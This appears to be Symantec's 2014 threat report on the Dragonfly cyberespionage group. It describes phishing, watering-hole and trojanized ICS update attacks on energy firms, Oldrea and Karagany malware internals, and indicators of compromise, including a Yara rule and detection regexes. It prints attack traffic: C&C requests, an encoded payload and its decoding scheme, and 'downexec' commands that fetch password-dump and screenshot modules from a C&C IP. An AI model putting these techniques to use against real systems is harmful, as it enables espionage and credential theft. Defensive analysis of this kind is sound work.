{
    "title": "Symantec - Dragonfly_Threat_Against_Western_Energy_Suppliers",
    "text": "SECURITY RESPONSE\nDragonfly initially targeted defense and aviation companies \nin the US and Canada before shifting its focus to US and European energy firms in early 2013.Dragonfly: Cyberespionage Attacks\nAgainst Energy Suppliers\nSymantec Security Response\nVersion 1.21:  July 7, 2014, 12:00 GMTDragonfly: Cyberespionage Attacks Against Energy SuppliersCONTENTS\nOVERVIEW  ..................................................................... 3\nTimeline  ......................................................................... 5\nVictims  .......................................................................... 5\nTools and tactics  ........................................................... 6\nSpam campaign  ....................................................... 6\nWatering hole attacks  ............................................. 6\nTrojanized software  ................................................. 7\nSource time zone .......................................................... 7\nConclusion  ..................................................................... 8\nAppendix - Technical Description ............................... 10\nLightsout exploit kit  .............................................. 10\nBackdoor.Oldrea  .................................................... 11\nRegistry modifications  .......................................... 11\nTrojan.Karagany  .................................................... 13\nIndicators of compromise  ........................................... 15\nLightsout exploit kit  ............................................. 15\nBackdoor.Oldrea  ................................................... 16\nTrojan.Karagany  .................................................... 17A cyberespionage campaign against a range of targets, mainly in the energy sector, gave \nattackers the ability to mount sabotage operations against their victims. The attackers, \nknown to Symantec as Dragonfly, managed to compromise a number of strategically \nimportant organizations for spying purposes and, if they had used the sabotage capabilities open to them, could have caused damage or disruption to the energy supply in the affected \ncountries.\nThe Dragonfly group, which is also known by other vendors as Energetic Bear, are a capable \ngroup who are evolving over time and targeting primarily the energy sector and related \nindustries. They have been in operation since at least 2011 but may have been active even \nlonger than that. Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus to US and European energy firms in early 2013. More \nrecent targets have included companies related to industrial control systems.  \nDragonfly has used spam email campaigns and watering hole attacks to infect targeted \norganizations. The group has used two main malware tools: Trojan.Karagany and \nBackdoor.Oldrea. The latter appears to be a custom piece of malware, either written by  \nor for the attackers.\nOVERVIEWA newer approach\nused by the attackersinvolvescompromising theupdate site for severalindustrial controlsystem (ICS) softwareproducers.\nTIMELINEPage 5\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\nTimeline\nSymantec observed spear phishing attempts in the form of emails with PDF attachments from February 2013 \nto June 2013. The email topics were related to office administration issues such as dealing with an account or problems with a delivery. Identified targets of this campaign were mainly US and UK organizations within the energy sector.\nIn May 2013, the attackers began to use the Lightsout exploit kit as an attack vector, redirecting targets from \nvarious websites. The use of the Lightsout exploit kit has continued to date, albeit intermittently. The exploit kit has been upgraded over time with obfuscation techniques. The updated version of Lightsout became known as the Hello exploit kit.\nA newer approach used by the attackers involves compromising the update site for several industrial control \nsystem (ICS) software producers. They then bundle Backdoor.Oldrea with a legitimate update of the affected software. To date, three ICS software producers are known to have been compromised.\nThe Dragonfly attackers used hacked websites to host command-and-control (C&C) software.  \nCompromised websites appear to consistently use some form of content management system. \nVictims\nThe current targets of the Dragonfly group, \nbased on compromised websites and hijacked software updates, are the energy sector and industrial control systems, particularly those based in Europe. While the majority of victims are located in the US, these appear to mostly be collateral damage. That is, many of these computers were likely infected either through watering hole attacks or update hijacks and are of no interest to the attacker. \nBy examining victims with active infections – \nwhere additional malicious activity has been detected – it is possible to gather a more accurate picture of ‘true’ victims.\nThe most active infections, as in Figure 2, are \n Figure 1. Timeline of Dragonfly operations\n Figure 2. Top 10 countries by active infectionPage 6\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\nin Spain, followed in order by the US, France, Italy, and Germany. \nTools and tactics\nDragonfly uses two main pieces of malware in its attacks. Both are Remote Access Tool (RAT) type malware \nwhich provide the attackers with access and control of compromised computers. Dragonfly’s favored malware tool is Backdoor.Oldrea, which is also known as Havex or the Energetic Bear RAT. Oldrea acts as a back door for the attackers on to the victim’s computer, allowing them to extract data and install further malware. \nOldrea appears to be custom malware, either written by the group itself or created for it. This provides some \nindication of the capabilities and resources behind the Dragonfly group. The second main tool used by Dragonfly is Trojan.Karagany. Unlike Oldrea, Karagany was available on the underground market. The source code for version 1 of Karagany was leaked in 2010. Symantec believes that Dragonfly may have taken this source code and modified for its own use.\nSymantec found that the majority of computers compromised by the attackers were infected with Oldrea. \nKaragany was only used in around 5 percent of infections. The two pieces of malware are similar in functionality and what prompts the attackers to choose one tool over another remains unknown. \nSpam campaign\nThe Dragonfly group has used at least three infection tactics against targets in the energy sector. The earliest method was an email spear phishing campaign, which saw selected executives and senior employees in target companies receive emails containing a malicious PDF attachment. Infected emails had one of two subject lines: “The account” or “Settlement of delivery problem”. All of the emails were from a single Gmail address. Figure 3 displays the number of different recipients per day.\nThe spam campaign began in \nFebruary 2013 and continued into June 2013. Symantec identified seven different organizations targeted in this campaign. At least one organization was attacked intermittently for a period of 84 days.\nWatering hole attacks\nIn June 2013, the attackers shifted their focus to watering hole attacks. They compromised a number of energy-related websites and injected an iframe into each of them. This iframe then redirected visitors to another compromised legitimate website hosting the Lightsout exploit kit. This in turn exploited either Java or Internet Explorer in order to drop Oldrea or Karagany on the victim’s computer. The fact that the attackers compromised multiple legitimate websites for each stage of the operation is further evidence that the group has strong technical capabilities.\n Figure 3. Spam campaign activity from mid-February 2014 to mid-June 2013Page 7\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\nIn September 2013, \nDragonfly began using a new version of this exploit kit, known as the Hello exploit kit. The landing page for this kit contains JavaScript which fingerprints the system, identifying installed browser plugins. The victim is then redirected to a URL which in turn determines the best exploit to use based on the information collected.\nFigure 4 shows the \ncompromised websites categorized into their respective industries. Fifty percent of identified targets were energy industry related and thirty percent were energy control systems, as shown in Figure 4. A clear shift in the attackers targeting can be seen in March 2014 when energy control systems become the primary target. \nTrojanized software\nThe most ambitious attack vector used by Dragonfly was the compromise of a number of legitimate software packages. Three different ICS equipment providers were targeted and malware was inserted into the software bundles they had made available for download on their websites.\nSource time zone\nAnalysis of the compilation timestamps on the malware used by the attackers indicate that the group mostly worked between Monday and Friday, with activity mainly concentrated in a nine-hour period that corresponded to a  9am to 6pm working day in the UTC +4 time zone. \n Figure 5. Number of samples compiled per hour, UTC time zone\n Figure 4. Targeted industries over timePage 8\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\nConclusion\nThe Dragonfly group is technically adept and able to think strategically. Given the size of some of its targets, the \ngroup found a “soft underbelly” by compromising their suppliers, which are invariably smaller, less protected companies.\n Figure 6. Number of samples compiled per day, UTC time zoneAPPENDIXPage 10\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\nAppendix - Technical Description\nIdentification of this group is based on the use of two malware families and an exploit kit. The malware families \nutilized are Backdoor.Oldrea and Trojan.Karagany. The exploit kit is known as Lightsout and/or Hello. Hello is an updated iteration of Lightsout that the Dragonfly group began to use in September 2013.\nUse of Backdoor.Oldrea appears to be limited to the Dragonfly group. In addition, specific instances of Trojan.\nKaragany have been used by this group. Karagany is a Russian RAT sold on underground forums. Instances of this malware related to the Dragonfly group are identified based on them being delivered through the Lightsout exploit kit and also a particular packer that this group used. Symantec detects the Trojan.Karagany packer used by this group as Trojan.Karagany!gen1.\nThe Lightsout exploit kit is a simple exploit kit that is consistently used to deliver primarily Backdoor.Oldrea and, \nin several instances, Trojan.Karagany. \nLightsout exploit kit\nA number of sites that use content management systems were exploited and an iframe was used in order to redirect visitors to sites hosting the Lightsout exploit kit. \nAn example of an injected iframe can be \nseen in figure 7.\nThe exploit kit uses browser (e.g. \nInternet Explorer and Firefox) and Java exploits in order to deliver either Backdoor.Oldrea or Trojan.Karagany. \nAn example of the structure of the Lightsout exploit kit can be seen Table 1. Note that file names and exploits \nused may vary.\nIn September 2013, the \nDragonfly group began using a new version of Lightsout, also known as the Hello exploit kit. The JavaScript included in the landing page redirects the browser to a URL that depends on the fonts installed on the system, browser add-ons, the OS version, and the user agent. At this point, it determines the best exploit to use, based on the information provided, and generates an appropriate URL to redirect the user to the appropriate exploit/payload. \nThe following shows an example of such a request:\n[http://]compromised.example/wp-includes/pomo/  \ndtsrc.php?a=[EK _ DETERMINED _ PARAMETER]\n Figure 7. Example of injected iframe link\nTable 1. Examples of file names for one implementation of the Lightsout exploit kit\nPage Description CVE\nInden2i.php First landing page N/A\nInden2i.html Second landing page N/A\nPluginDetect.js PluginDetect script N/A\nStoh.html Java 6 exploit Jar request file N/A\nStoh.jar Java 6 Exploit CVE-2012-1723\nGami.html Java 7 exploit Jar request file N/A\nGami.jar Java 7 exploit CVE-2013-2465\nTubc.html IE7 Exploit CVE-2012-4792\nNegc.html IE8 Exploit CVE-2013-1347Page 11\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\n[EK_DETERMINED_PARAMETER]  may be anything \nlisted in Table 2.\nThe parameters dwe and dwd relate to which \npayload is requested for download, for example: \n• When a Backdoor.Oldrea payload is requested \n[EK_DETERMINED_PARAMETER] is dwd\n• When a Karagany!gen1 payload is requested [EK_DETERMINED_PARAMETER] is dwe\nThe values of the [EK_DETERMINED_PARAMETER] \nvariable may relate to the two different file types represented by Backdoor.Oldrea and Trojan.Karagany!gen1 payloads. Oldrea payloads are DLL files (URLs end in “d” for DLL?) while Karagany!gen1 payloads are portable executables (URLs end in “e” for EXE?).\nBackdoor.Oldrea\nAt the core of Backdoor.Oldrea is a persistent component that interacts with C&C servers to download and execute payloads. The components are downloaded by reaching out to the C&C server and performing a GET request which returns an HTML page containing a base64 encoded string between two comments marked with the ‘havex’ string.\nInstallation\nFile system modifications\n• %Temp%\\qln.dbx\n• %System%\\TMPprovider038.dll\nRegistry modifications\nIn this specific example, the ‘038’ in the file name indicates the major version number.\n• HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”TmProvider”\n• HKEY_LOCAL_MACHINE\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\”TmProvider”\n• HKEY_LOCAL_MACHINE\\ SOFTWARE\\Microsoft\\Internet Explorer\\InternetRegistry\\”fertger”\n• HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\InternetRegistry\nCode injection\n• Backdoor.Oldrea injects code into explorer.exe.\nNetworking\nPost infection, Backdoor.Oldrea will attempt to collect system information such as OS, user name, computer \nname, country, language, nation, Internet adapter configuration information, available drives, default browser, running processes, desktop file list, My Documents, Internet history, program files, and root of available drives. It also collects data from Outlook (address book) and ICS related software configuration files. This data is collected and written to a temporary file in an encrypted form before it is POST’ed to a remote C&C server. The following are examples of a POST request and a POST response: Table 2. Lightsout exploit kit parameters\nPage Description\nH2 Java Exploit (<v1.7.17)\nH3 Chrome /w Java (<1.7.17)\nH4 IE6 & OSVer < Vista – 6\nH5 Java Exploit (<v1.7.17 & OSver < Vista)\nH6 IE8 & OSVer < Vista\nH7 Java Exploit (<=v1.6.32)\nR2 Malicious JAR file\nR7 Malicious JAR file\nDwe Malicious PE file\nDwd Malicious PE filePage 12\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\nPOST request example:\nPOST /wp08/wp-includes/dtcla.php?id=285745296322896178920098FD80-20&v1=038&v2=17\n0393861&q=5265882854508EFCF958F979E4 HTTP/1.1User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.36 Safari/525.19Host: toons.freesexycomics.comContent-Length: 0Cache-Control: no-cache\nPOST response example:\nHTTP/1.1 200 OKDate: Wed, 22 Jan 2014 13:40:48 GMTContent-Type: text/htmlTransfer-Encoding: chunkedConnection: keep-aliveServer: Apache/1.3.37 (Unix)Cache-Control: no-cache\n9f65\n<html><head><mega http-equiv=’CACHE-CONTROL’ content=’NO-CACHE’></head><body>No data!<!--havexQlpoOTFBWSZTWWYvDI0BOsD/////////////////////////////////////////////4oB+93VVXu69DuN7XYzds9yt49Ques\n[...TRUNCATED FOR READABILITY ]\n+yUW3zfTxWAOstsCwCckdW5 AH5Q6vbbCu7GputPt5CSfgPCAKXcAOOICMsqliACGYEhAQT3v9eD\nM92D/8XckU4UJBmLwyNA==havex--></body></head>\nVarious samples process the C&C responses differently. \nIn one example, the sample searches for the data enclosed by the tag ‘havex’. Once the data is found, it is \ndecoded using standard base64 + bzip2 and also a xor layer with bytes from the string 1312312. The decoded data contains a small header followed by an executable MZ-file.\nAnother sample was found to use standard base64 + reverse xor + RSA-2048 for decrypting received data. The \ndecrypted data consists of a 6 byte command concatenated with an MZ file. The MZ file is compressed with the lzma algorithm. RSA keys for decryption, together with other initial configuration information, are stored in the registry in base64 form.\nPayloads\nThis section includes information about identified payloads downloaded by Backdoor.Oldrea.\nThe following is a brief description of the functionality for each identified component:\n• Tmpprovider  is a persistent component that interacts with the C&C server (downloads and executes payloads).\n• The InstallerFormDll  component usually embeds another executable (DLL) in its resource section to be \nloaded. The sample analyzed carried a Web browser password recovery tool originating from \nhttp://securityxploded.com/browser-password-decryptor.php\n• The RunExeCmdSingle  component is a DLL file that drops and executes another executable. The export \n‘runDll’ of this file is where the logic is implemented.\n• DropCommandsCmd  is a cleanup module, used to remove traces of itself from the infected computer.\n• The GetFileCmd  modules check for the existence of specific files on the infected host. The two samples look \nfor the ICS related software file and Outlook’s autocomplete address book file (outlook.nk2).Page 13\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\nTrojan.Karagany\nTrojan.Karagany is a back door used primarily for recon. It is designed to download and install additional files \nand exfiltrate data. Samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer/protector for the payload. Where present in samples, the Delphi packer is configured to use ‘neosphere’ as a key to decrypt the payload. \nThe following is a brief overview of the functionality of Trojan.Karagany:\n• Can upload, download, and execute files on the system\n• Has plugin capability (may load several plugins for added functionality, such as Web injects)\n• Payload is approximately 72Kb in size and is programmed in C/C++\n• Contains a small embedded DLL file, which monitors WSASend and send APIs for capturing ‘Basic \nAuthentication’ credentials\nInstallation\nTrojan.Karagany creates a folder in the user APPDATA directory and chooses the directory name from the \nfollowing list:\n• Microsoft WCF services\n• Broker services\n• Flash Utilities\n• Media Center Programs\n• Policy Definitions\n• Microsoft Web Tools\n• Reference Assemblies\n• Analysis Services\n• InstallShield Information\n• IIS SQL Server\n• Diagnostics\n• NTAPI Performance\n• WPF Platform\nIt copies itself in the created directory with hidden and system attributes using a file name chosen from the \nfollowing list:\n• SearchIndexer.exe\n• ImeBroker.exe\n• fsutil.exe\n• PnPutil.exe\n• BdeUISrv.exe\n• WinSAT.exe\n• pwNative.exe\n• SnippingTool.exe\n• DFDWizard.exe\n• PrintBrmEngine.exe\n• WbemMonitor.exe\n• dxpserver.exe\n• PowerMng.exePage 14\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\nTrojan.Karagany copies itself with hidden and system attributes where it was first executed as err.log[DIGITS]. It \nthen copies the legitimate chkdsk utility in the installation folder using the payload file name but with a space before the file extension. This may fool ordinary users into thinking that this folder contains a legitimate application, for example PnPutil .exe. Trojan.Karagany!gen1 may create the following additional files in the installation folder:\n• Form.api\n• inact.api\n• prog.cer\n• Cent.api\n• ie.pdb\nIt then creates a C:\\ProgramData\\Mail\\MailAg\\gl directory as a temporary directory used for uploading files.  \nTrojan.Karagany then creates a link to itself in the Startup folder as an autostart when the system restarts.\nNetworking\nTrojan.Karagany first checks for a live Internet connection by visiting Microsoft or Adobe websites. It will only reach \nout to its C&C server once this check is successful.\nExample HTTP Requests\nInternet connection test to Microsoft\nGET /en-us/default.aspx HTTP/1.1   Accept-Encoding: gzip, deflate   Content-Type: application/x-www-form-urlencoded  \n  Host: microsoft.com  \n  Cookie: MC1=V=3&GUID=<32 character guid>   Connection: Keep-Alive   Cache-control: no-cache\nInternet connection test to Adobe using identifiant parameter\nPOST /geo/productid.php HTTP/1.1  Content-Type: application/x-www-form-urlencoded  Host: adobe.com  ...  identifiant=51032 _ 175129256364\nExample POST request for C&C server check-in\nPOST /check _ value.php HTTP/1.1  User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; .NET CLR  2.0.50727)  Host: 93.188.161.235  ...  identifiant=51032 _ 1799883375637&version=i2pver\nHTTP response example\nHTTP/1.1 200 OK  \n  Date: Tue, 28 Jan 2014 05:59:58 GMT   Vary: Accept-Encoding  \n  Content-Length: 324  \n  Content-Type: text/html  \n  X-Powered-By: PHP/5.3.10-1ubuntu3.9  \n  Via: 1.1 host.alexsieff.com  \n  work:3|downexec [http://]93.188.161.235/check2/muees27jxt/shot.jpg;  \n  work:5|downexec [http://]93.188.161.235/check2/muees27jxt/tl.jpg;  \n  work:7|downexec [http://]93.188.161.235/check2/muees27jxt/fl.jpg;   work:103|downexec [http://]93.188.161.235/check2/muees27jxt/pdump.jpg;  \n  work:118|downexec [http://]93.188.161.235/check2/muees27jxt/fl.jpg;Page 15\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\nThe POST data contains the operating system version and a derived number:\n•  identifiant=[OS VERSION]_[DERIVED NUMBER]\nUser-Agent tokens used in C&C requests are hard-coded. The following two examples have been observed:• Mozilla/17.0 (compatible; MSIE 8.0; Windows NT 6.1; .NET CLR 2.0.50727; .NET CLR 3.5.30729)\n• Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; .NET CLR 2.0.50727; .NET CLR 3.5.30729)\nDownloaded components\n• pdump.jpg  - Used for dumping passwords into \\ProgramData\\Mail\\MailAg\\pwds.txt. Needs ‘vaultcli.dll’ library\n• fl.txt  - Used for listing RTF, PST, DOC, XLS, PDF, *pass*.*, *secret*.* files into \\ProgramData\\Mail\\MailAg\\fls.txt\n• tl.jpg  - Used to list running task using ‘tasklist’ utility\n• shot.jpg - Used for desktop screenshot, file is saved into \\ProgramData\\Mail\\MailAg\\shot.png\nIndicators of compromise\nLightsout exploit kit \nWatering holes\nTable 3. Detected exploit sites hosting the Lightsout exploit kit and referrer\nInfected website Infected website \nindustryInfected website nationalityExploit site Last Seen\nwww.s[REDACTED]e.az File hosting service Azerbaijan blog.olioboard.com 18/06/2014 01:19\nwww.t[REDACTED]e.no Energy control systems Norwegian www.manshur.ir 24/05/2014 10:53\nwww.s[REDACTED]e.az File hosting service Azerbaijan realstars.ir 06/05/2014 22:20\ns[REDACTED]e.az File hosting service Azerbaijan realstars.ir 06/05/2014 23:30\nwww.f[REDACTED]y.com Energy American aptguide.3dtour.com 11/04/2014 12:26\nwww.t[REDACTED]e.no Energy control systems Norwegian seductionservice.com 07/04/2014 06:42\nwww.a[REDACTED]t.it Energy control systems Italian seductionservice.com 06/04/2014 22:25\nwww.e[REDACTED]t.it Energy control systems Italian seductionservice.com 05/04/2014 22:57\nb[REDACTED]n.in Energy control systems Indian mahsms.ir 23/03/2014 23:01\nwww.v[REDACTED]z.com Energy French mahsms.ir 21/03/2014 22:30\nwww.r[REDACTED]e.fr Energy French mahsms.ir 14/03/2014 04:30\nwww.e[REDACTED]m.eu Energy French aptguide.3dtour.com 04/03/2014 21:27\nwww.r[REDACTED]e.fr Energy French keeleux.com 30/11/2013 06:57\nwww.v[REDACTED]z.com Energy French keeleux.com 11/10/2013 12:18Page 16\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\nDetection for HTTP request of Lightsout payload \nRegular expression for URL or HTTP request-line searches:\n• [^=]*=(dw[de]|fn[de])$\nBackdoor.Oldrea \nDetection for Oldrea HTTP C&C requests\n• \\.php\\?id=[0-9A-F]{28}.{0,5}&v1=[0-9]{1,5}&v2=[0-9]{1,10}&q=[0-9A-F]{20}\nDetection for files created during installation\nRegular expression for file system searches:• (TMPprovider[0-9]{3}\\.dll|sy[ds]main\\.dll)Table 4. Recent Oldrea C&C servers detected by Symantec\nHostname First Seen Last Seen\na[REDACTED]e.com 25/02/2014 15:57 23/06/2014 21:06\ne[REDACTED]k.ru 25/02/2014 18:47 23/06/2014 20:51\nr[REDACTED]r.ru 25/02/2014 15:44 23/06/2014 17:21\nl[REDACTED]l.net 25/02/2014 15:54 23/06/2014 12:51\nc[REDACTED]b.ru 25/02/2014 22:37 23/06/2014 12:13\nl[REDACTED]r.ru 05/03/2014 14:00 22/06/2014 22:06\np[REDACTED]3.ru 11/06/2014 03:34 22/06/2014 06:18\nr[REDACTED]a.com 30/04/2014 00:07 17/06/2014 22:57\n7[REDACTED]t.com 26/02/2014 09:43 13/06/2014 08:59\ns[REDACTED]s.com 29/04/2014 23:43 13/06/2014 02:55\nwww.r[REDACTED]l.com 05/03/2014 19:18 19/03/2014 17:21\nw[REDACTED]c.org 26/02/2014 04:51 11/03/2014 23:30\ns[REDACTED]s.com 06/09/2013 04:03 16/01/2014 23:54\ns[REDACTED]f.com.ua 14/01/2014 21:46 16/01/2014 22:49\nd[REDACTED]k.com 14/01/2014 08:46 16/01/2014 22:48\nz[REDACTED]k.com 14/01/2014 21:47 16/01/2014 22:47\nblog.o[REDACTED]d.com 19/09/2013 07:12 16/01/2014 22:40\na[REDACTED]l.com 06/09/2013 04:41 16/01/2014 20:52\na[REDACTED]r.com 19/09/2013 01:44 15/01/2014 05:57\nk[REDACTED]x.com 20/09/2013 00:22 26/09/2013 04:25\nblog.k[REDACTED]x.com 20/09/2013 04:04 25/09/2013 07:57\ndl.3[REDACTED]e.com 28/08/2013 06:38 06/09/2013 10:07\nj[REDACTED]p.co.jp 28/08/2013 06:33 06/09/2013 09:37\ns[REDACTED]e.net 28/08/2013 09:12 06/09/2013 03:54Page 17\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\nRegistry changes made during installation\n• HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\”TmProvider”\n• HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”TmProvider”\nTrojan.Karagany \n• 91.203.6.71\n• 93.171.216.118\n• 93.188.161.235\nFormat of data initial POST request made to C&C server\n• identifiant=[OS VERSION]_[DERIVED NUMBER]\nHTTP requests for uploading data with the format:\n• filename=[FILE NAME]&identifiant=[INFO DERIVED FROM OS]&fichier=[ENCODED DATA FROM FILE]\nYara rule\nKaragany Yara rule:\nprivate rule isPE\n{            condition:                  uint16(0) == 0x5A4D and uint32(uint32(0x3c)) == 0x00004550}\nrule Trojan _ Karagany\n{            meta:  \n                  alias = “Dreamloader”              strings:                  $s1 = “neosphere” wide ascii                  $s2 = “10000000000051200” wide ascii                  $v1 = “&fichier” wide ascii                  $v2 = “&identifiant” wide ascii                  $c1 = “xmonstart” wide ascii                  $c2 = “xmonstop” wide ascii                  $c3 = “xgetfile” wide ascii                  $c4 = “downadminexec” wide ascii                  $c5 = “xdiex” wide ascii                  $c6 = “xrebootx” wide ascii            condition:                  isPE and (($s1 and $s2) or ($v1 and $v2) or (any of ($c*)))}About Symantec\nSymantec protects the world’s information and is the \nglobal leader in security, backup, and availability solutions. \nOur innovative products and services protect people and \ninformation in any environment—from the smallest mobile \ndevice to the enterprise data center to cloud-based systems. \nOur industry-leading expertise in protecting data, \nidentities, and interactions gives our customers confidence \nin a connected world. More information is available at \nwww.symantec.com or by connecting with Symantec at \ngo.symantec.com/socialmedia.\nHeadquartered in Mountain View, Calif.,  \nSymantec has operations in 40 countries. \nMore information is available at www.symantec.com.\nFor specific country offices and contact numbers, please visit our website.\nSymantec World Headquarters\n350 Ellis St.Mountain View, CA 94043 USA+1 (650) 527-80001 (800) 721-3934www.symantec.comCopyright © 2014 Symantec Corporation. All \nrights reserved. Symantec, the Symantec Logo, and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation \nor its affiliates in the U.S. and other countries. \nOther names may be trademarks of their \nrespective owners.\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec\nCorporation. \nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use \nof the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.AuthorsSymantec Security Response \n "
}